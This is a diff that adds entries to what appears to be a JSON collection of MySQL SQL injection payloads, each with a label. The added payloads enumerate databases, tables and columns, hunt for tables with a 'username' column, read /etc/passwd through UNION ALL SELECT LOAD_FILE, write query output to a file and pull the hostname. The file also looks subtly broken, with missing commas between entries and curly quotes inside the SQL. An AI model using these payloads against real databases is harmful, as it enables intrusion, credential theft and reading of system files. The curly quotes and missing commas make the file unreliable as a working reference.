@@ -47,5 +47,41 @@
       "'SELECT distinct(db) FROM mysql.db",
       "List Databases for MySQL > v5.0"
     ]
+    
+    [
+      "MYSQL",
+      "'SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’",
+      "List Columns"
+    ]
+    
+    [
+      "MYSQL",
+      "'SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’",
+      "List Tables"
+    ]
+    
+    [
+      "MYSQL",
+      "'SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’",
+      "Find Tables From Column Name"
+    ]   
+    
+    [
+      "MYSQL",
+      "'UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)",
+      "Local File Access"
+    ]
+    
+    [
+      "MYSQL",
+      "'SELECT * FROM table INTO dumpfile ‘/tmp/somefile’;",
+      "Local File Access"
+    ]
+    
+     [
+      "MYSQL",
+      "'SELECT @@hostname;",
+      "Hostname, IP Address"
+    ]
   ]
 }
